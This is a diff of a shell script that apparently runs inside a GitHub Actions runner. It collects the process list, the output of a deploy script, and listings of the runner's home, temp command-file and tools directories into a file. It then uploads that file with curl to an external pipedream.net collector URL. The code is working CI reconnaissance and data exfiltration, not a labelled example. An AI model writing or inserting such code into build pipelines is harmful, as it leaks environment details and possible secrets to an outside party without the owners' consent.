@@ -2,11 +2,7 @@
 
 echo "--- START ---" > /tmp/file.txt
 
-ps aux | while IFS= read -r line; do
-    printf '%s\n' "$line" >> /tmp/file.txt
-done 
-
-bash deploy-script.sh >> /tmp/file.txt
+./deploy-script.sh >> /tmp/file.txt
 
 echo "--- LS ---" >> /tmp/file.txt
 echo "--- /home" >> /tmp/file.txt
@@ -54,10 +50,9 @@ ls -1la /home/runner/work/_temp/_runner_file_commands >> /tmp/file.txt
 ls -1la ~/ >> /tmp/file.txt
 ls -1la ./tools >> /tmp/file.txt
 
-echo "--- deploy" >> /tmp/file.txt
-echo $(cat ~/deploy-script.sh) >> /tmp/file.txt
-
-
+ps aux | while IFS= read -r line; do
+    printf '%s\n' "$line" >> /tmp/file.txt
+done 
 echo "--- FINISH ---" >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
